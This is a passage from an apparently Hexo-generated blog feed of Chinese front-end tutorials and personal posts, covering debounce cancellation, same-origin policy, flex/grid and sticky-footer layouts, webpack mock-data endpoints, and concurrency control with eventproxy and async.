title="取消"></a>取消</h3><p>最后我们希望能够取消debounce函数，比如我们的debounce函数的时间间隔是10秒钟，immediate为true，这样的话，我们只有等待10s后才可以触发事件，所以我希望能有一个按钮能够取消防抖，这样再去触发，就可以又立刻执行啦。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait, immediate</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> timeout, result;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> debounced = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (timeout) clearTimeout(timeout);</span><br><span class="line">        <span class="keyword">if</span> (immediate) &#123;</span><br><span class="line">            <span class="comment">// 如果已经执行过，不再执行</span></span><br><span class="line">            <span class="keyword">var</span> callNow = !timeout;</span><br><span class="line">            timeout = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                timeout = <span class="literal">null</span>;</span><br><span class="line">            &#125;, wait)</span><br><span class="line">            <span class="keyword">if</span> (callNow) result = func.apply(context, args)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            timeout = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                func.apply(context, args)</span><br><span class="line">            &#125;, wait);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    debounced.cancel = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clearTimeout(timeout);</span><br><span class="line">        timeout = <span class="literal">null</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> debounced;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们如何使用cancel函数呢？依然以上面的demo为例<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> container = <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  container.innerHTML++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> setAction = debounce(getAction,<span class="number">10000</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">container.onmousemove = setAction;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"button"</span>).addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  setAction.cancel();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>效果演示如下：<br><img src="http://www.chenqaq.com/assets/images/debounce3.gif" alt="debounce cancel"></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> underscore </tag>
            
            <tag> 防抖与节流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器同源政策</title>
      <link href="/2018/03/15/cross-domain-cors/"/>
      <url>/2018/03/15/cross-domain-cors/</url>
      
        <content type="html"><![CDATA[<p>我们都知道浏览器的“同源政策”是浏览器安全的基石，根本目的是为了保护用户信息安全，防止恶意的网站窃取数据。<br>1995年，同源政策由Netscape 公司引入。目前，所有浏览器都执行这个政策。<br><a id="more"></a><br>随着互联网的发展，保障用户的信息安全也越来越重要。非同源将受到三种行为的限制：</p><blockquote><ul><li>Cookie、localstorage、IndexDB无法读取</li><li>DOM无法获得</li><li>AJAX无法发送</li></ul></blockquote><p>所谓”同源”即指三个相同，</p><blockquote><ul><li>域名相同</li><li>协议相同</li><li>端口相同</li></ul></blockquote><p>举个栗子，<a href="http://www.chenqaq.com我的网址，协议就是http://,域名是www.chenqaq.com，端口默认为80。" target="_blank" rel="noopener">http://www.chenqaq.com我的网址，协议就是http://,域名是www.chenqaq.com，端口默认为80。</a></p><p>ing…</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨域 </tag>
            
            <tag> 同源政策 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拥抱未来的布局方式：flex 和 grid</title>
      <link href="/2018/03/07/css-layout-flex-grid/"/>
      <url>/2018/03/07/css-layout-flex-grid/</url>
      
        <content type="html"><![CDATA[<p>相比传统的布局方式，flex 和 grid 使布局系统简化，轻松的解决了复杂的 web 布局。<br>早在以前，所有的 HTML 布局还是通过 table，float 以及其他 css 属性来完成。面对复杂的布局，就没有很好的办法了。<br>随着 flexbox 的出现，它专注于创建稳健的响应式页面布局模式，并轻松的正确对齐元素及其内容。如今已是我们的首选。</p><a id="more"></a><p><a href="https://caniuse.com/#feat=flexbox" target="_blank" rel="noopener">Can I Use FlexBox?</a></p><p><img src="http://www.chenqaq.com/assets/images/css-layout-flex1.png" alt=""></p><p>如今 flexbox 随着浏览器的发展（IE9 以下版本渐渐退出舞台），flexbox 如火如荼成为了 css 布局的主流，前端开发者的首选。</p><p>与此同时，grid 布局在 2010 年由 Microsoft 首次提出，目前已成为 W3C 候选标准，支持 grid 布局的浏览器也越来越多</p><p><a href="https://caniuse.com/#feat=css-grid" target="_blank" rel="noopener">Can I Use Grid?</a></p><p><img src="http://www.chenqaq.com/assets/images/css-layout-grid1.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> layout </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stricky footer的三种解决方案</title>
      <link href="/2018/02/01/css-layout-strickyFooter/"/>
      <url>/2018/02/01/css-layout-strickyFooter/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>stricky footer设计是最古老和最常见的效果之一，我们都曾经历过类似的情景：</p><blockquote><p>如果页面内容不够长的时候，页脚块粘贴在底部；如果内容足够长时，页脚块会被内容向下推送。<br><a id="more"></a><br>这些天做vue+express实战的练习，跟着黄轶老师倒是认识了stricky footer，就认真的了解学习了一下，但是前两天的问题，今天几种解决方案的详细情况竟然有些模糊，所以还是记录下来吧！求学之路就是这样，不断地积累和重复。</p></blockquote><p><img src="http://www.chenqaq.com/assets/images/strickyFooter1.png" alt=""></p><p>上图底部的<code>x</code>就用到了经典的stricky footer，当页面内容足够时，它会向下推送；当页面内容没有撑满整个屏幕时，它就固定在底部。</p><p>而不是像下图这样：</p><p><img src="http://www.chenqaq.com/assets/images/strickyFooter2.png" alt=""></p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>如果此前不知道stricky footer，使用fixed固定在底部的话，像下图这样</p><p><img src="http://www.chenqaq.com/assets/images/strickyFooter3.png" alt=""></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">position</span>: <span class="selector-tag">fixed</span>;</span><br><span class="line"><span class="selector-tag">width</span>: 32<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">height</span>: 32<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">bottom</span>: 20<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">left</span>: <span class="selector-tag">calc</span>(50% <span class="selector-tag">-</span> 16<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">font-size</span>: 32<span class="selector-tag">px</span>;</span><br></pre></td></tr></table></figure><p>那样 <code>x</code> 会覆盖内容，显然是不符合要求的不实际的，而且不美观的。</p><p>所以经典的stricky footer 广为所用，适用情景也非常多，前几天回顾第一次做的项目，发现很多地方适用。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>stricky footer主要有三种解决方案，我们构建一点简单的代码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="1-为内容区域添加最小的高度"><a href="#1-为内容区域添加最小的高度" class="headerlink" title="1.为内容区域添加最小的高度"></a>1.为内容区域添加最小的高度</h2><p>这个方法主要是用视口vh来计算整体视窗的高度，然后减去底部footer的高度，从而得出内容区域的最小高度<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">min-height</span>:<span class="built_in">calc</span>(100vh - `footer的高度`);</span><br><span class="line">  <span class="attribute">box-sizing</span>:border-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这种方法很简单，但是如果页面的footer高度不同，每个页面都要重新计算一次，所以并不推荐</p><h2 id="2-使用flex布局"><a href="#2-使用flex布局" class="headerlink" title="2.使用flex布局"></a>2.使用flex布局</h2><p>flex布局如今在移动端布局可谓是占有一片天地，广为所用。</p><p>我们通常利用flex布局对视窗宽度进行分割，一侧是固定宽度，另一侧是自适应宽度。同样的，flex布局当然也可以对对视窗高度进行分割，footer的flex为0，这样flex获得其固有的高度；content的flex为1。这样它会充满除去footer的其余部分</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>:flex;</span><br><span class="line">  <span class="attribute">flex-flow</span>:column;</span><br><span class="line">  <span class="attribute">min-height</span>:<span class="number">100vh</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>:<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.footer</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法较为推荐</p><h2 id="3-在content的外面添加一个wrapper层"><a href="#3-在content的外面添加一个wrapper层" class="headerlink" title="3.在content的外面添加一个wrapper层"></a>3.在content的外面添加一个wrapper层</h2><p>这种方法也是黄轶老师使用的方法，在content的外面添加一个wrapper层包裹</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content-wrapper clearfix"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种做法为了保证兼容性，我们通常会在wrapper层上添加一个clearfix类，</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span>,<span class="selector-tag">body</span>,<span class="selector-class">.content-wrapper</span>&#123;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">100%</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span> &gt; <span class="selector-class">.content-wrapper</span>&#123;</span><br><span class="line">  <span class="attribute">height</span>:auto;</span><br><span class="line">  <span class="attribute">min-height</span>:<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">padding-bottom</span>:<span class="number">150px</span> //与footer的高度相同</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.footer</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>:relative;</span><br><span class="line">  margin-top:-150px; // -`footer高度`</span><br><span class="line">  <span class="selector-tag">height</span><span class="selector-pseudo">:150px</span>;</span><br><span class="line">  <span class="selector-tag">clear</span><span class="selector-pseudo">:both</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>:inline-block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>:<span class="string">""</span>;</span><br><span class="line">  <span class="attribute">display</span>:block;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">0</span>;</span><br><span class="line">  <span class="attribute">clear</span>:both;</span><br><span class="line">  <span class="attribute">visibility</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就完成了stricky footer，这种方法也比较推荐，但是加入的代码有点多，而且改变了HTML结构。</p>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> layout </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一月就要结束，我的2018年已经开始！</title>
      <link href="/2018/01/25/life-aboutLife-job/"/>
      <url>/2018/01/25/life-aboutLife-job/</url>
      
        <content type="html"><![CDATA[<h1 id="我的2017"><a href="#我的2017" class="headerlink" title="我的2017"></a>我的2017</h1><p>最近偶然想起来拿出大一下（2017年2月-3月）给「郑州百格教育」写过的手机端的官网，看了又看，想着如果用这一年的学习，来重做一次这个官网，我会怎么做？觉得自己这一年来应该是有了不小的进步吧！</p><p>关于2017年，太多我已经记不清，我觉得上天还是很眷顾我的，或者说我是幸运的，收到了一些邀请，但是始终都没有达到心中的目标。<br><a id="more"></a></p><h1 id="悄然来到的2018"><a href="#悄然来到的2018" class="headerlink" title="悄然来到的2018"></a>悄然来到的2018</h1><p>1月21号，我申请加入<a href="https://github.com/xitu/gold-miner" target="_blank" rel="noopener">掘金翻译计划</a>通过，并完成校对一篇文章<a href="https://juejin.im/post/5a676c33f265da3e5b32f43c" target="_blank" rel="noopener">Vue Devtools 4.0 有哪些新内容</a>，成为广大译者中的其中一员。这真是一个很棒的计划，有很多的译者，可以一起交流英语和技术。</p><p><img src="http://www.chenqaq.com/assets/images/life-0.jpg" alt=""></p><p>其实自己一直有一个编者梦，大学的第二个目标就是希望能够有机会成为一名签约技术小编。17年我也收到了一些邀请（比如慕课网手记，腾讯云+社区邀请），但是他们的”邀请”都不是我心中的目标，但是我也积极参与到他们当中。</p><p>直到昨天，我收到了「阿里巴巴新零售事业群」的面试邀请（邮件中说到，是在github上发现我），我知道，收到这封邮件的人何止以百来计量，新零售是阿里近两年提出并付诸实践的战略。</p><p>就这样我成为了广大收到邀约面试邮件的其中一员，无奈我只是一个大二在校生，面对「前端专家」这样的邀请，社招的流程，终归还是会落空。</p><p>《大学》中开篇说到：“大学之大，在明明德，在亲民，在止于至善”，大学是一个从半成熟走向成熟的过程，慢慢的变得稳重，遇到问题开始从容坦然的解决。</p><p>其实对于这次邀请我并不惊讶，我却很从容（回复邮件也尤为理智吧），我知道我很用心的在维护我的github和博客，我总是相信，机会总是会眷顾那些有准备并且等待被发现的人，事实证明我是对的。</p><p>阿里是我大学给自己定下的第三个目标（但是遗憾我只能失去这次邀请机会，不过我回复邮件并且得到了他们的认可，今天也收到了他们的回信），期待着我的2018。</p><p><img src="http://www.chenqaq.com/assets/images/life-3.jpg" alt=""></p><p>其实我很清楚收到邮件的人不在少数。但是就这样，我成为了身边同学称的“励志的人”。但是我却清晰的认识到自己所处的位置，这并不是不自信，反而是一种自信，我能拿下的，我定赴汤蹈火。但是对于我一个大二的在校生，何敢以专家称，面对前端浩如烟海的知识面，自当愿付出10年甚至20年的韶华去专研，面对日新月日的技术栈，稍有停留，怕追上你的不是千人。</p><p>《追风筝的人》中有一句话，相信很多有梦想的孩子，都喜欢这句话</p><p><code>For you, a thousand times over</code></p><p>就像你开始一眼看到这本书觉得它所描述的一定是天真无邪的孩童在明媚的阳光下无忧无虑的奔跑，但是不曾想这本书却描述一个情节跌宕起伏一个十九世纪七十年代的阿富汗富家少爷和仆人孩子之间的友谊，充满了悲伤的意味，阿米尔和哈桑牵动了读者的心。我们都在不断的追逐那风筝。你的2018一定是不轻松的，但是希望你捡起心中的美好，愿陌上花开，不负韶华。</p><p>2018开始了，或许和过去的2017年有些不太一样。</p><p><img src="http://www.chenqaq.com/assets/images/life-4.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找不到dev-server，请允许我给mock数据找一个接口</title>
      <link href="/2018/01/19/vueCl-exExpressDataMock-I-do-t-have-devServer/"/>
      <url>/2018/01/19/vueCl-exExpressDataMock-I-do-t-have-devServer/</url>
      
        <content type="html"><![CDATA[<p>我们想要给我们的mock data 找一个接口请求，原版配置在 dev-server.js ，新版的 vue-webpack-template 删除了dev-server.js，改用webpcak.dev.conf.js代替（具体更新见<a href="https://github.com/vuejs-templates/webpack/pull/975" target="_blank" rel="noopener">github：switch to webpack-dev-server</a>）</p><p><img src="http://www.chenqaq.com/assets/images/vuecli1.png" alt="switch to webpack-dev-server"><br><a id="more"></a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// # webpack.dev.conf.js</span></span><br><span class="line"><span class="comment">// 在const portfinder = require('portfinder')添加我们需要的一些模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// node的开发框架express来简化操作</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">// mock data</span></span><br><span class="line"><span class="keyword">const</span> appDate = <span class="built_in">require</span>(<span class="string">'../mock/data.json'</span>)</span><br><span class="line"><span class="keyword">const</span> seller = appDate.seller;</span><br><span class="line"><span class="keyword">const</span> goods = appDate.goods;</span><br><span class="line"><span class="keyword">const</span> ratings = appDate.ratings;</span><br></pre></td></tr></table></figure></p><p>1、get请求配置<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># webpack.dev.conf.js</span><br><span class="line"><span class="comment">// 在devServer选项中添加以下内容</span></span><br><span class="line"></span><br><span class="line">before(app)&#123;</span><br><span class="line">  app.get(<span class="string">'/api/seller'</span>,(req,res)=&gt;&#123;</span><br><span class="line">    res.json(&#123;</span><br><span class="line">      errno : <span class="number">0</span>,</span><br><span class="line">      data : seller</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  app.get(<span class="string">'/api/goods/'</span>,(req,res)=&gt;&#123;</span><br><span class="line">    res.json(&#123;</span><br><span class="line">      errno : <span class="number">0</span>,</span><br><span class="line">      data : goods</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  app.get(<span class="string">'/api/ratings'</span>,(req,res)=&gt;&#123;</span><br><span class="line">    res.json(&#123;</span><br><span class="line">      errno : <span class="number">0</span>,</span><br><span class="line">      data : ratings</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>关于<code>devServer.before()</code> webpack有很详细的解释，并且给出了一个例子，它提供了在服务器内部所有中间件之前执行的自定义中间件的能力，用它可以来自定义处理程序</p><p><img src="http://www.chenqaq.com/assets/images/webpack1.png" alt="devServer.before"></p><p>修改完配置之后，我们需要重新运行命令<code>npm run dev</code>重新编译即可</p><p>然后标题栏访问<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/api/seller</span></span><br></pre></td></tr></table></figure></p><p><img src="http://www.chenqaq.com/assets/images/vuecli-json1.png" alt="api/seller"></p><p>同样的，我们访问<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/api/goods</span></span><br><span class="line"><span class="comment">// 和</span></span><br><span class="line">http:<span class="comment">//localhost:8080/api/ratings</span></span><br></pre></td></tr></table></figure></p><p>同样得到了我们的mock data，哈哈，终于给我们的mock data找了一个接口</p><p>2、post请求配置</p><p>如果配置post请求，我们可以做一下配置<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// # webpack.dev.conf.js</span></span><br><span class="line">app.post(<span class="string">'/api/foods'</span>,(req,res)=&gt;&#123;</span><br><span class="line">  res.json(&#123;</span><br><span class="line">    errno : <span class="number">0</span>,</span><br><span class="line">    data : foods</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在组件中</span></span><br><span class="line"><span class="comment">// # ..vue</span></span><br><span class="line">created()&#123;</span><br><span class="line">  <span class="keyword">this</span>.$http.post(<span class="string">'http://localhost:8080/api/foods'</span>).then(res)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样我们的<code>data mock</code>就有接口可以访问喽。</p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> express </tag>
            
            <tag> vueCli </tag>
            
            <tag> webpcak </tag>
            
            <tag> mock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学校寒冬的清晨和深夜</title>
      <link href="/2018/01/10/life-aboutSchool-finalExam/"/>
      <url>/2018/01/10/life-aboutSchool-finalExam/</url>
      
        <content type="html"><![CDATA[<p>最近忙着期末考试前的复习，倒也不紧不慢，反而看到了学校不一样的风景。</p><p>行走匆忙的人，不一定是无心观赏两岸的风景，只是为了心中的彼岸<br><a id="more"></a><br><img src="http://www.chenqaq.com/assets/images/morning.jpg" alt="morning"></p><p><img src="http://www.chenqaq.com/assets/images/night.jpg" alt="night"></p>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用async和enterproxy控制并发数量</title>
      <link href="/2017/12/31/async-enterproxy-control-concurrency/"/>
      <url>/2017/12/31/async-enterproxy-control-concurrency/</url>
      
        <content type="html"><![CDATA[<h1 id="聊聊并发与并行"><a href="#聊聊并发与并行" class="headerlink" title="聊聊并发与并行"></a>聊聊并发与并行</h1><p>并发我们经常提及之，不管是web server，app并发无处不在，操作系统中，指一个时间段中几个程序处于已经启动运行到完毕之间，且这几个程序都是在同一处理机上运行，并且任一个时间点只有一个程序在处理机上运行。很多网站都有并发连接数量的限制，所以当请求发送太快的时候会导致返回值为空或报错。更有甚者，有些网站可能因为你发出的并发连接数量过多而当你是在恶意请求，封掉你的ip。<br><a id="more"></a><br>相对于并发，并行可能陌生了不少，并行指一组程序按独立异步的速度执行，不等于时间上的重叠（同一个时刻发生），通过增加cpu核心来实现多个程序(任务)的同时进行。没错，并行做到了多任务的同时进行</p><h1 id="使用enterproxy控制并发数量"><a href="#使用enterproxy控制并发数量" class="headerlink" title="使用enterproxy控制并发数量"></a>使用enterproxy控制并发数量</h1><p>enterproxy是朴灵大大为主要贡献的工具，带来一种事件式编程的思维变化，利用事件机制解耦复杂业务逻辑，解决了回调函数耦合性的诟病，将串行等待变成并行等待，提升多异步协作场景下的执行效率</p><p>我们如何使用enterproxy控制并发数量？通常如果我们不使用enterproxy和自制的计数器，我们如果抓取三个源：</p><p>这种深层嵌套，串行的方式<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">var</span> render = <span class="function"><span class="keyword">function</span> (<span class="params">template, data</span>) </span>&#123;</span><br><span class="line">    _.template(template, data);</span><br><span class="line">    &#125;;</span><br><span class="line">$.get(<span class="string">"template"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">template</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// something</span></span><br><span class="line">  $.get(<span class="string">"data"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// something</span></span><br><span class="line">    $.get(<span class="string">"l10n"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">l10n</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// something</span></span><br><span class="line">      render(template, data, l10n);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>除去这种过去深层嵌套的方法，我们常规的写法的自己维护一个计数器<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> result  = &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    $.get(<span class="string">'template'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        result.data1 = data;</span><br><span class="line">        count++;</span><br><span class="line">        handle();</span><br><span class="line">    &#125;)</span><br><span class="line">    $.get(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        result.data2 = data;</span><br><span class="line">        count++;</span><br><span class="line">        handle();</span><br><span class="line">    &#125;)</span><br><span class="line">    $.get(<span class="string">'l10n'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        result.data3 = data;</span><br><span class="line">        count++;</span><br><span class="line">        handle();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(count === <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> html = fuck(result.data1,result.data2,result.data3);</span><br><span class="line">            render(html);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p><p>在这里，enterproxy就可以起到这个计数器的作用，它帮你管理这些异步操作是否完成，完成之后，他会自动调用你提供的处理函数，并将抓取到数据当做参数传递过来<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ep = <span class="keyword">new</span> enterproxy();</span><br><span class="line">ep.all(<span class="string">'data_event1'</span>,<span class="string">'data_event2'</span>,<span class="string">'data_event3'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data1,data2,data3</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> html = fuck(data1,data2,data3);</span><br><span class="line">    render(html);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$.get(<span class="string">'http:example1'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    ep.emit(<span class="string">'data_event1'</span>,data);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$.get(<span class="string">'http:example2'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    ep.emit(<span class="string">'data_event2'</span>,data);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$.get(<span class="string">'http:example3'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    ep.emit(<span class="string">'data_event3'</span>,data);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>enterproxy还提供了其他不少场景所需的API，可以自行学习下这个API <a href="https://github.com/JacksonTian/eventproxy" target="_blank" rel="noopener">enterproxy</a></p><h1 id="使用async控制并发数量"><a href="#使用async控制并发数量" class="headerlink" title="使用async控制并发数量"></a>使用async控制并发数量</h1><p>假如我们有40个请求需要发出，很多网站可能会因为你发出的并发连接数太多而当你是在恶意请求，把你的IP封掉。<br>所以我们总是需要控制并发数量，然后慢慢抓取完这40个链接。</p><p>使用async中mapLimit控制一次性并发数量为5，一次性只抓取5个链接。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span>.mapLimit(arr, <span class="number">5</span>, <span class="function"><span class="keyword">function</span> (<span class="params">url, callback</span>) </span>&#123;</span><br><span class="line">     <span class="comment">// something</span></span><br><span class="line">   &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error, result</span>) </span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">"result: "</span>)</span><br><span class="line">     <span class="built_in">console</span>.log(result);</span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure><p>我们首先应该知道什么是<code>并发</code>，为什么需要限制并发数量，都有哪些处理方案。然后就可以去文档具体看一下API如何使用。<a href="https://caolan.github.io/async/" target="_blank" rel="noopener">async文档</a>可以很好的学习这些语法。</p><p>模拟一组数据，这里返回的数据是假的，返回的延时是随机的。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span 